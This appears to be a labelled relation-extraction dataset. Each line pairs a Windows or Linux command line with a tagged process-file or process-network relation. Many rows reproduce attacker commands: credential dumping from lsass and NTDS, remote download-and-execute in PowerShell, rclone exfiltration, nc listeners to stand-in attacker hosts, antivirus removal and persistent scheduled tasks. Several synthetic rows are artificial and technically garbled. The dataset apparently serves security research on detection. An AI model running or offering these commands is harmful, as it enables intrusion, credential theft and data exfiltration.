process-socket-send(e1,e2)	<e1>rundll32.exe</e1> Invoke-WebRequest -Uri <e2>10.10.10.10:4444</e2> -Method POST
process-file-read(e1,e2)	<e1>cmd.exe</e1> /c copy <e2>\\SOURCE_SERVER_IP\c\windows\temp\k.exe</e2> c:\windows\temp\
process-file-read(e1,e2)	"reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d <e1>""reg.exe</e1> save <e2>hklm\system</e2> c:\ProgramData\system.save"" /f"
process-file-write(e1,e2)	<e1>mshta_75.exe</e1> -write <e2>C:\Users\Public\hta_payload_75.hta</e2>
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> runas /user:admin <e2>rundll32.exe</e2>
process-file-unlink(e1,e2)	svchost.exe <e1>Remove-Item</e1> <e2>/var/tmp/hide.so</e2> -Force
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>dllinjector.exe</e2> -p taskmgr.exe -d payload.dll
process-socket-send(e1,e2)	"rundll32.exe <e1>powershell</e1> -c ""Invoke-RestMethod -Uri <e2>https://evil.server/payload</e2> -Body 'cmd=whoami'"""
process-process-unlink(e1,e2)	<e1>powershell.exe</e1> kill $(Get-Process <e2>taskmgr.exe.Id)</e2>
process-process-fork(e1,e2)	<e1>%WINDIR%\system32\cmd.exe</e1> /C <e2>net</e2> user REDACTED /dom
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>C:\ProgramData\AnyDesk.exe</e2> --get-id
process-file-write(e1,e2)	<e1>certutil_0.exe</e1> -encode input_0.txt <e2>C:\temp\encoded_0.txt</e2>
process-file-read(e1,e2)	"<e1>restic.exe</e1> -r rest:http://195.123.226.84:8000/ --password-file <e2>ppp.txt</e2> --use-fs-snapshot --verbose backup ""F:\Shares\<REDACTED>\<REDACTED>"""
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>ping</e2> http://<IP redacted>/
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>Remove-Item</e2> C:\Users\Public\runme.bat -Force
process-file-exec(e1,e2)	"<e1>mmc.exe</e1> <e2>""C:\Windows\System32\gpedit.msc""</e2>"
process-process-unlink(e1,e2)	<e1>rundll32.exe</e1> kill $(Get-Process <e2>taskmgr.exe.Id)</e2>
Other	ping -n 1 <e1><REDACTED>shell</e1> <e2>wmic</e2> /node:<REDACTED> process get executablepath
process-file-read(e1,e2)	<e1>cmd_2.exe</e1> /c type <e2>C:\Windows\System32\drivers\etc\hosts</e2>
process-file-read(e1,e2)	<e1>ls.exe</e1> all -oN -output <e2>C:\Users\REDACTED</e2>
process-file-exec(e1,e2)	"<e1>rundll32.exe</e1> <e2>""C:\Users\[REDACTED]\AppData\Local\[REDACTED]\[REDACTED]\Utucka.dll"",1</e2> --oxoj=""CategoryBeyond\license.dat"""
process-file-unlink(e1,e2)	svchost.exe <e1>rm</e1> <e2>/usr/local/bin/backdoor</e2>
process-file-chmod(e1,e2)	cmd.exe <e1>icacls</e1> <e2>C:\ProgramData\updater.exe</e2> /grant Everyone:F
process-file-write(e1,e2)	"<e1>find.exe</e1> -f ""(objectcategory=group)"" > <e2>ad_group.txt</e2>"
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>del</e2> /var/tmp/hide.so
process-file-read(e1,e2)	"<e1>restic.exe</e1> -r rest:http://195.123.226.84:8000/ --password-file ppp.txt --use-fs-snapshot --verbose backup <e2>""F:\Shares\<REDACTED>\<REDACTED>""</e2>"
process-file-read(e1,e2)	"<e1>reg</e1> query <e2>hklm\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall</e2> /v ""DisplayName"" /s"
process-process-unlink(e1,e2)	<e1>C:\Windows\System32\taskkill.exe</e1> /IM <e2>veeam.guest.interaction.proxy.exe</e2> /F
process-process-fork(e1,e2)	"<e1>start</e1> <e2>wmic</e2> product where name=""Sophos Remote Management System"" call uninstall /nointeractive"
process-file-read(e1,e2)	cmd.exe <e1>dllinjector.exe</e1> -p winlogon.exe -d <e2>payload.dll</e2>
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>ping</e2> HOST
process-file-chmod(e1,e2)	C:\Windows\system32\cmd.exe /c <e1>attrib</e1> +S +H <e2>%appdata%\Microsoft\Network\Packages.txt</e2>
process-process-fork(e1,e2)	"<e1>cmd.exe</e1> /Q /c <e2>schtasks.exe</e2> /create /sc onlogon /tn ""Wow64 Subsystem"" /rl highest /tr ""%%programdata%%\schcache\mswow86.exe"""
process-file-write(e1,e2)	cmd_95.exe /c <e1>echo</e1> %USERNAME% >> <e2>C:\output\users_95.txt</e2>
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>rm</e2> C:\Windows\Temp\evil.dll
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>socat</e2> TCP4-LISTEN:8080,fork 192.168.1.100:8080
process-file-exec(e1,e2)	<e1>invokemodule</e1> -module locker -locker <e2><REDACTED>.dll</e2> -lockerpath programdata\microsoft -lockertype dll -lockername sysfunc -lockerdeployonly $true -lockerentrypoint run -handlesystems custom
process-file-exec(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>C:\Windows\Temp\adf\adf.bat</e2>
process-process-fork(e1,e2)	"cmd.exe /C <e1>netsh</e1> advfirewall firewall add rule dir=in name =""UnsecApp"" <e2>program=C:\Windows\system32\wbem\unsecapp.exe</e2> action=allow > C:\Windows\Temp\HaALurWi.tmp 2>&1"
process-file-write(e1,e2)	<e1>rundll32_50.exe</e1> shell32.dll,Control_RunDLL <e2>C:\Temp\config.ini</e2>
process-socket-send(e1,e2)	<e1>wmic.exe</e1> Invoke-WebRequest -Uri <e2>10.10.10.10:4444</e2> -Method POST
process-process-fork(e1,e2)	<e1>wmic.exe</e1> /c start <e2>python.exe</e2>
process-socket-receive(e1,e2)	svchost.exe <e1>python3</e1> -m <e2>http.server 8080</e2> --bind 10.10.10.10:4444
process-socket-receive(e1,e2)	wmic.exe <e1>socat</e1> <e2>TCP4-LISTEN:8080,fork</e2> 192.168.1.100:8080
process-file-exec(e1,e2)	"<e1>wmic.exe</e1> -Command ""Start-Process <e2>C:\Windows\Temp\evil.dll""</e2>"
process-file-exec(e1,e2)	<e1>cmd.exe</e1> -exec <e2>C:\Users\Public\runme.bat</e2>
process-socket-send(e1,e2)	"<e1>""%PUBLIC%\Music\rclone.exe""</e1> copy E:\REDACTED\customers <e2>ftp1:REDACTED/customers</e2> -q --ignore-existing --REDACTED-confirm --multi-thread-streams 12 --transfers 12 --no-console"
process-file-chmod(e1,e2)	wmic.exe <e1>attrib</e1> +s +h <e2>C:\ProgramData\updater.exe</e2>
process-file-read(e1,e2)	<e1>notepad_41.exe</e1> <e2>C:\Users\admin\notes_41.txt</e2>
process-process-fork(e1,e2)	<e1>torify</e1> <e2>nuclei</e2> -u shabak.gov.il -o shabak.gov.il_new
process-file-unlink(e1,e2)	powershell.exe <e1>Remove-Item</e1> <e2>C:\Users\Public\runme.bat</e2> -Force
process-file-write(e1,e2)	cmd.exe /Q /c <e1>expand</e1> cache.cab -F:* c:\programdata 1> <e2>\\127.0.0.1\ADMIN$\____REDACTED</e2> 2>&1
process-socket-send(e1,e2)	cmd.exe /C <e1>net</e1> view <e2>\\WORKSTATION</e2> /all
process-file-exec(e1,e2)	<e1>powershell.exe</e1> /c start <e2>C:\Windows\Temp\evil.dll</e2>
process-file-exec(e1,e2)	<e1>cmd.exe</e1> /c start <e2>/var/tmp/hide.so</e2>
process-socket-send(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>tasklist</e1> /v /s <e2><REDACTED_IP></e2>
process-file-exec(e1,e2)	<e1>rundll32.exe</e1> /c start <e2>C:\Users\Public\runme.bat</e2>
process-process-fork(e1,e2)	<e1>cmd_74.exe</e1> /c <e2>echo</e2> %USERNAME% >> C:\output\users_74.txt
process-process-fork(e1,e2)	<e1>svchost.exe</e1> /c start <e2>wmic.exe</e2>
process-process-unlink(e1,e2)	<e1>cmd.exe</e1> Stop-Process -Name <e2>lsass.exe</e2> -Force
process-process-unlink(e1,e2)	<e1>taskkill</e1> /f /im <e2>net1895.exe</e2>
process-process-fork(e1,e2)	"<e1>svchost.exe</e1> <e2>powershell</e2> -c ""Invoke-RestMethod -Uri 192.168.1.100:8080 -Body 'cmd=whoami'"""
process-file-chmod(e1,e2)	rundll32.exe <e1>attrib</e1> +s +h <e2>/var/tmp/hide.so</e2>
process-file-read(e1,e2)	<e1>powershell_16.exe</e1> Get-Content <e2>C:\Users\Public\secrets_16.txt</e2>
process-process-fork(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>wmic</e2> /node:""REDACTED"" process call create ""c:\windows\system32\rundll32.exe c:\windows\temp\1.dll, DllRegisterServer‘"
process-file-read(e1,e2)	<e1>7z_34.exe</e1> x <e2>C:\Users\Public\archive_34.7z</e2> -so > nul
process-file-write(e1,e2)	"<e1>reg</e1> add <e2>""HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server""</e2> /v fDenyTSConnections /t REG\_DWORD /d 0 /f"
process-process-unlink(e1,e2)	<e1>net</e1> stop <e2>MSExchangeDiagnostics</e2>
process-socket-receive(e1,e2)	<e1>rclone.exe</e1> copy <e2>\\SERVER.domain.name\path</e2> mega:1 -q --ignore-existing --auto-confirm --multi-thread-streams 6 --transfers 6
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c <e2>echo</e2> dec8f35bcbf > \\.\pipe\7fd13a
process-socket-send(e1,e2)	<e1>C:\Windows\SysWOW64\explorer.exe</e1> <e2>\\IP_ADDRESS_1\C</e2>
process-file-exec(e1,e2)	<e1>svchost.exe</e1> /c start <e2>C:\Windows\Temp\evil.dll</e2>
process-process-fork(e1,e2)	<e1>procdump.exe</e1> -accepteula -ma <e2>lsass.exe</e2> mem.dmp
process-file-write(e1,e2)	"<e1>python_39.exe</e1> -c <e2>""open('C:\\Users\\admin\\payload_39.exe',</e2> 'wb').write(b'\x90\x90\x90')"""
process-file-read(e1,e2)	<e1>nuclei</e1> -l <e2>co_nic_gov</e2> -o co_nic_gov_proxy_output -s critical -proxy socks5://localhost:1080
process-file-read(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>7za.exe</e1> a -tzip -mx5 <e2>c:\programdata\lsass.dmp</e2> c:\programdata\lsass.zip
process-file-unlink(e1,e2)	svchost.exe <e1>del</e1> <e2>/var/tmp/hide.so</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /C <e2>dir</e2> *.txt
process-file-read(e1,e2)	powershell.exe <e1>reg</e1> query <e2>HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest</e2> /v UseLogonCredential
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>socat</e2> TCP4-LISTEN:8080,fork https://evil.server/payload
process-process-fork(e1,e2)	"<e1>wmic.exe</e1> <e2>powershell</e2> -c ""Invoke-RestMethod -Uri 10.10.10.10:4444 -Body 'cmd=whoami'"""
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>python3</e2> -m http.server 8080 --bind http://attacker.com/c2
process-file-read(e1,e2)	"<e1>svchost.exe</e1> --config <e2>svchost.conf</e2> --progress --no-check-certificate copy ""\\ServerName\C\ShareName"" ftp1:/DomainName/FILES/C/ShareName"
process-process-fork(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>powershell</e2> -c ""get-eventlog 'Security' | where {$_.Message -like '*<REDACTED>*' -AND 'Source Network Address'} | export-csv c:\windows\temp\events_<REDACTED>.txt"""
process-socket-receive(e1,e2)	powershell.exe <e1>nc</e1> -lvp 4444 -s <e2>https://evil.server/payload</e2>
process-file-unlink(e1,e2)	"start <e1>wmic</e1> product where <e2>name=""McAfee Endpoint Security Platform""</e2> call uninstall /nointeractive"
process-file-exec(e1,e2)	"<e1>svchost.exe</e1> -Command ""Start-Process <e2>C:\Users\Public\runme.bat""</e2>"
process-file-exec(e1,e2)	"C:\Windows\System32\schtasks.exe /Create /SC MINUTE /TN ""Update service for Windows Service"" /TR <e1>PowerShell.exe</e1> -ExecutionPolicy bypass -windowstyle hidden -File <e2>C:\Users\Administrator\update.ps1</e2> /MO 30 /F"
process-file-write(e1,e2)	torify <e1>nuclei</e1> -l large_scope -o <e2>large_scope</e2> -s critical,high
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>icacls</e2> C:\ProgramData\updater.exe /grant Everyone:F
process-process-inject(e1,e2)	cmd.exe <e1>dllinjector.exe</e1> -p <e2>lsass.exe</e2> -d payload.dll
process-process-unlink(e1,e2)	wmic.exe <e1>taskkill</e1> /IM <e2>lsass.exe</e2> /F
process-process-fork(e1,e2)	"C:\Windows\system32\cmd.exe /C WMIC/node:""DC.DOMAIN.local"" process call create <e1>""cmd</e1> /c <e2>C:\PerfLogs\servisess.exe""</e2>"
process-socket-send(e1,e2)	powershell.exe <e1>curl</e1> -X POST --data 'ping' <e2>10.10.10.10:4444</e2>
process-file-read(e1,e2)	<e1>reg_20.exe</e1> query <e2>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion</e2>
process-process-fork(e1,e2)	<e1>powershell.exe</e1> runas /user:admin <e2>python.exe</e2>
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>chmod</e2> 777 /var/tmp/hide.so
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>wevtutil</e2> cl system
process-file-exec(e1,e2)	<e1>wmic.exe</e1> -exec <e2>/tmp/malware.sh</e2>
process-file-exec(e1,e2)	<e1>c:\windows\temp\procdump64.exe</e1> -accepteula -ma <e2>lsass.exe</e2> fwtsqmfile00.dmp
process-file-exec(e1,e2)	"<e1>rundll32.exe</e1> <e2>""C:\Users\USERNAME\AppData\Local\Temp\skull-x64.dat"",update</e2> /i:""DwarfWing\license.dat"""
process-file-write(e1,e2)	"cmd.exe /C netsh advfirewall firewall add rule dir=in name =""UnsecApp"" <e1>program=C:\Windows\system32\wbem\unsecapp.exe</e1> action=allow > <e2>C:\Windows\Temp\HaALurWi.tmp</e2> 2>&1"
process-file-read(e1,e2)	<e1>wscript_30.exe</e1> readAll <e2>C:\inetpub\wwwroot\web_30.config</e2>
process-process-fork(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>powershell.exe</e2> -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring(' http://104.243.33.50:80/a '))"""
process-file-read(e1,e2)	"<e1>python_38.exe</e1> -c <e2>""open('C:\\temp\\pw_38.txt').read()""</e2>"
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>rm</e2> C:\Users\Public\runme.bat
process-file-exec(e1,e2)	<e1>cmd.exe</e1> /c <e2>\\<domaincontroller>\netlogon\def.vbs</e2>
process-file-write(e1,e2)	"<e1>af.exe</e1> -f ""objectcategory=computer"" > <e2>ad_computers.txt</e2>"
process-file-chmod(e1,e2)	svchost.exe <e1>attrib</e1> +s +h <e2>/usr/local/bin/backdoor</e2>
process-file-read(e1,e2)	<e1>7z_89.exe</e1> x <e2>C:\Users\Public\archive_89.7z</e2> -so > nul
process-file-write(e1,e2)	"<e1>python_31.exe</e1> -c <e2>""open('C:\\Users\\admin\\payload_31.exe',</e2> 'wb').write(b'\x90\x90\x90')"""
process-file-chmod(e1,e2)	rundll32.exe <e1>chmod</e1> 777 <e2>/var/tmp/hide.so</e2>
process-process-fork(e1,e2)	"<e1>VeeamHax.exe</e1> --verbose --target <backup server> --port 9401 --cmd <e2>""c:\windows\notepad.exe""</e2> --sql ""EXEC sp\_configure 'xp\_cmdshell', '1' """
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>attrib</e2> +s +h /usr/local/bin/backdoor
process-file-exec(e1,e2)	<e1>regsvr32</e1> <e2>C:\users\public\music\kaslose64.dll</e2>
process-file-read(e1,e2)	<e1>typeperf.exe</e1> <e2>System\Processor Queue Length</e2> -si 180 -sc 1
process-file-read(e1,e2)	"""C:\Windows\System32\schtasks.exe"" /Create /SC MINUTE /TN ""Update service for Windows Service"" /TR <e1>PowerShell.exe</e1> -ExecutionPolicy bypass -windowstyle hidden -File <e2>C:\Users\Administrator\update.ps1</e2>"
process-file-write(e1,e2)	<e1>mshta_28.exe</e1> -write <e2>C:\Users\Public\hta_payload_28.hta</e2>
process-file-exec(e1,e2)	<e1>cmd.exe</e1> -exec <e2>C:\ProgramData\updater.exe</e2>
process-file-chmod(e1,e2)	svchost.exe <e1>chmod</e1> 777 <e2>/usr/local/bin/backdoor</e2>
process-file-read(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c cd <e2>%appdata%\Microsoft\Network</e2> && powershell -Command start script.bat -Verb RunAs
process-file-unlink(e1,e2)	powershell.exe <e1>del</e1> <e2>/usr/local/bin/backdoor</e2>
process-file-chmod(e1,e2)	<e1>attrib</e1> +h <e2>svshost.exe</e2>
Other	cmd.exe /q /c reg add <e1>hkey_local_machine\system\currentcontrolset\control\lsa</e1> /v disablerestrictedadmin /t reg_dword /d 0 1> <e2>\\127.0.0.1\admin\$\__<timestamp>\.<num></e2> 2>&1
process-file-write(e1,e2)	"C:\Windows\system32\cmd.exe /C wmic /node:<REDACTED> process call create <e1>""cmd</e1> /C > <e2>C:\ProgramData\1.txt</e2> 2>&1 reg query HKEY_USERS\<SID>\Network"""
process-process-fork(e1,e2)	"<e1>start</e1> <e2>wmic</e2> product where name=""McAfee Endpoint Security Threat Prevention"" call uninstall /nointeractive"
process-socket-receive(e1,e2)	powershell.exe <e1>socat</e1> <e2>TCP4-LISTEN:8080,fork</e2> 192.168.1.100:8080
process-file-write(e1,e2)	"<e1>reg</e1> add <e2>""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon""</e2> /v DefaultUserName /t REG_SZ /d <REDACTED-DOMAIN-NAME>\backup2 /f"
process-process-unlink(e1,e2)	<e1>C:\Windows\System32\taskkill.exe</e1> /IM <e2>veeam.backup.externalinfrastructure.dbprovider.exe</e2> /F
process-process-fork(e1,e2)	"<e1>powershell.exe</e1> <e2>powershell</e2> -c ""Invoke-RestMethod -Uri 10.10.10.10:4444 -Body 'cmd=whoami'"""
process-process-fork(e1,e2)	%WINDIR%\system32\cmd.exe /c <e1>net</e1> user <e2>sqlbackup</e2> Password!1221! /add
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /C <e2>net</e2> view /all >> C:\Users\<REDACTED>\AppData\Local\Temp\BD2C.bin1
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>ping</e2> [Domain Controller]
process-file-exec(e1,e2)	<e1>cmd.exe</e1> -exec <e2>/var/tmp/hide.so</e2>
process-socket-receive(e1,e2)	rundll32.exe <e1>nc</e1> -lvp 4444 -s <e2>10.10.10.10:4444</e2>
process-file-write(e1,e2)	"<e1>cmd.exe</e1> /c ren <e2>""%temp%\magni.waut.a""</e2> ""magni.w"""
process-file-write(e1,e2)	<e1>ftp_41.exe</e1> -s:script_41.txt <e2>C:\inetpub\wwwroot\ftp_41.log</e2>
process-file-read(e1,e2)	"<e1>PsExec.exe</e1> /accepteula <e2>@comps1.txt</e2> -u ""domain.local\Administrator"" -p ""REDACTED"" cmd /c COPY ""\\REDACTED\share$\ds.exe"" ""%WINDIR%\temp"""
process-process-inject(e1,e2)	python.exe <e1>dllinjector.exe</e1> -p <e2>explorer.exe</e2> -d payload.dll
process-process-inject(e1,e2)	<e1>powershell.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>notepad.exe</e2>
process-socket-receive(e1,e2)	powershell.exe <e1>python3</e1> -m <e2>http.server 8080</e2> --bind 192.168.1.100:8080
process-socket-send(e1,e2)	<e1>mstsc.exe</e1> <e2>/v:IP_ADDRESS_2</e2>
process-file-write(e1,e2)	"<e1>python_77.exe</e1> -c <e2>""open('C:\\Users\\admin\\payload_77.exe',</e2> 'wb').write(b'\x90\x90\x90')"""
process-process-unlink(e1,e2)	<e1>powershell.exe</e1> Stop-Process -Name <e2>notepad.exe</e2> -Force
process-process-fork(e1,e2)	"<e1>wmic</e1> /node:""TARGET_HOST_IP"" /user:""DOMAIN\USER"" /password:""PASSWORD"" process call create <e2>""cmd.exe</e2> /c copy \\SOURCE_SERVER_IP\c\windows\temp\p.bat c:\windows\temp"""
process-file-write(e1,e2)	<e1>ntdsAudit.exe</e1> ntds.dit -s SYSTEM -p <e2>pwddump.txt</e2> -u users.csv
process-process-fork(e1,e2)	<e1>cmd_62.exe</e1> /c <e2>echo</e2> malicious > C:\Temp\evil_62.bat
process-file-unlink(e1,e2)	<e1>wmic.exe</e1> <e2>Shadowcopy Delete</e2>
process-file-read(e1,e2)	"<e1>powershell_26.exe</e1> -Command ""gc <e2>C:\ProgramData\conf_26.yaml""</e2>"
process-file-read(e1,e2)	<e1>cmd_76.exe</e1> /c type <e2>C:\Windows\System32\drivers\etc\hosts</e2>
Other	C:\Windows\system32\cmd.exe /c cd <e1>%appdata%\Microsoft\Network</e1> && <e2>python.exe</e2> Packages.txt
process-file-unlink(e1,e2)	python.exe <e1>Remove-Item</e1> <e2>C:\ProgramData\updater.exe</e2> -Force
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>dllinjector.exe</e2> -p explorer.exe -d payload.dll
process-file-read(e1,e2)	"<e1>python_82.exe</e1> -c <e2>""open('C:\\temp\\pw_82.txt').read()""</e2>"
process-socket-send(e1,e2)	"%WINDIR%\system32\cmd.exe /C wmic /node:""REDACTED"" process call create <e1>""%WINDIR%\Temp\svhost.exe</e1> <e2>143.244.146[.]183""</e2>"
process-file-read(e1,e2)	<e1>wmic_4.exe</e1> process get commandline < <e2>C:\cmd\proc_4.txt</e2>
process-file-write(e1,e2)	<e1>cmd.exe</e1> /Q /c cd programdata 1> <e2>\\127.0.0.1\ADMIN$\____REDACTED</e2> 2>&1
process-process-fork(e1,e2)	"<e1>""C:\Windows\System32\schtasks.exe""</e1> /CREATE /SC ONSTART /TN jf0c /TR <e2>""'C:\Users\pagefilerpqy.exe'""</e2> /f /RL HIGHEST"
process-file-read(e1,e2)	<e1>%WINDIR%\system32\cmd.exe</e1> /c <e2>%PUBLIC%\Music\WMI.bat</e2>
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>Remove-Item</e2> C:\ProgramData\updater.exe -Force
process-process-fork(e1,e2)	<e1>python.exe</e1> /c start <e2>cmd.exe</e2>
process-socket-receive(e1,e2)	powershell.exe <e1>socat</e1> <e2>TCP4-LISTEN:8080,fork</e2> http://attacker.com/c2
process-file-unlink(e1,e2)	wmic.exe <e1>rm</e1> <e2>/usr/local/bin/backdoor</e2>
process-process-fork(e1,e2)	"<e1>""C:\Windows\System32\schtasks.exe""</e1> /CREATE /SC ONSTART /TN jf0c /TR <e2>C""':\Users\pagefilerpqy.exe'""</e2> /f"
process-socket-send(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>ping</e1> <e2>DOMAINCONTROLLER</e2>
process-socket-receive(e1,e2)	svchost.exe <e1>nc</e1> -lvp 4444 -s <e2>http://attacker.com/c2</e2>
process-file-read(e1,e2)	<e1>powershell_37.exe</e1> Get-Content <e2>C:\Users\Public\secrets_37.txt</e2>
process-file-read(e1,e2)	"schtasks.exe /create /sc minute /mo 1 /tn ""SSH Server"" /rl highest /tr <e1>""C:\ProgramData\sshd\sshd.exe</e1> -f <e2>C:\ProgramData\sshd\config\sshd_config""</e2>"
process-file-read(e1,e2)	"PsExec.exe /accepteula @comps1.txt -u ""domain.local\Administrator"" -p ""REDACTED"" <e1>cmd</e1> /c COPY ""\\REDACTED\share$\ds.exe"" <e2>""%WINDIR%\temp""</e2>"
process-socket-send(e1,e2)	"<e1>rclone.exe</e1> copy ""\\SERVER.domain.name\path"" <e2>mega:2</e2> -q --ignore-existing --auto-confirm --multi-thread-streams 6 --transfers 6"
Other	C:\Windows\system32\cmd.exe /c cd <e1>%appdata%\Microsoft\Network</e1> && <e2>powershell</e2> -Command start script.bat -Verb RunAs
process-file-exec(e1,e2)	<e1>cmd.exe</e1> /c start <e2>/tmp/malware.sh</e2>
process-file-read(e1,e2)	"C:\Windows\system32\cmd.exe /C <e1>Net</e1> group <e2>""Domain Admins""</e2> /domain \"
process-file-chmod(e1,e2)	svchost.exe <e1>attrib</e1> +s +h <e2>/tmp/malware.sh</e2>
process-process-inject(e1,e2)	<e1>c:\windows\system\procdump.exe</e1> -accepteula -ma <e2>lsass.exe</e2> lsass.dmp
process-socket-receive(e1,e2)	powershell.exe <e1>python3</e1> -m <e2>http.server 8080</e2> --bind 10.10.10.10:4444
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>echo</e2> J9kzQ2Y0qO | C:\ProgramData\anydesk.exe --set-password
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>python3</e2> -m http.server 8080 --bind https://evil.server/payload
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>curl</e2> -X POST --data 'ping' 192.168.1.100:8080
Other	C:\Windows\system32\cmd.exe /C for /f %i in <e1>(C:\ProgramData\servers.txt)</e1> do ping -n 1 %i -v 4 | find /I TTL >> <e2>C:\ProgramData\servers_live.txt</e2>
process-socket-send(e1,e2)	<e1>zero.exe</e1> <e2>[TARGET_DC_NETBIOS_NAME]</e2> [TARGET_DC_MACHINE_ACCOUNT$] administrator -c whoami
process-process-inject(e1,e2)	<e1>svchost.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>taskmgr.exe</e2>
process-process-fork(e1,e2)	<e1>svchost.exe</e1> /c start <e2>svchost.exe</e2>
process-file-write(e1,e2)	"powershell.exe <e1>""ntdsutil.exe</e1> 'ac i ntds' 'ifm' 'create full <e2>c:\ProgramData\ntdsutil'</e2> q q"""
process-process-fork(e1,e2)	"c:\windows\system32\cmd.exe /c <e1>wmic</e1> /node:""<REDACTED>"" process call create <e2>""c:\perflogs\setup1.exe""</e2>"
Other	cmd.exe /C rundll32.exe <e1>C:\windows\System32\comsvcs.dll,</e1> MiniDump 968 <e2>C:\ProgramData\REDACTED\lsass.dmp</e2> full
process-process-unlink(e1,e2)	"<e1>C:\Windows\system32\net1</e1> stop <e2>""veeamcatalogsvc""</e2> /y"
process-file-write(e1,e2)	<e1>mshta_71.exe</e1> -write <e2>C:\Users\Public\hta_payload_71.hta</e2>
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>taskkill</e2> /IM explorer.exe /F
process-file-write(e1,e2)	<e1>adfind.exe</e1> -gcb -sc trustdmp > <e2>trustdmp.txt</e2>
process-process-fork(e1,e2)	<e1>powershell.exe</e1> runas /user:admin <e2>powershell.exe</e2>
process-file-read(e1,e2)	<e1>cmd.exe</e1> /C copy <e2>192145.dll</e2> \\<INTERNAL_IP>\ADMIN$ /Y /Z
process-file-write(e1,e2)	cmd.exe /Q /c <e1>expand</e1> cache.cab -F:* <e2>c:\programdata</e2> 1> \\127.0.0.1\ADMIN$\____REDACTED 2>&1
process-process-unlink(e1,e2)	<e1>wmic.exe</e1> Stop-Process -Name <e2>svchost.exe</e2> -Force
Other	C:\Windows\system32\cmd.exe /C C:\Windows\Temp\adf\anchorAsjuster_x64.exe <e1>--source=anchorDNS_x64.exe</e1> <e2>--target=anchor_x64.exe</e2> --domain=xyskencevli.com,sluaknhbsoe.com --period=2 --lasthope=2 -guid
process-process-fork(e1,e2)	<e1>cmd.exe</e1> runas /user:admin <e2>wmic.exe</e2>
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>taskkill</e2> /IM taskmgr.exe /F
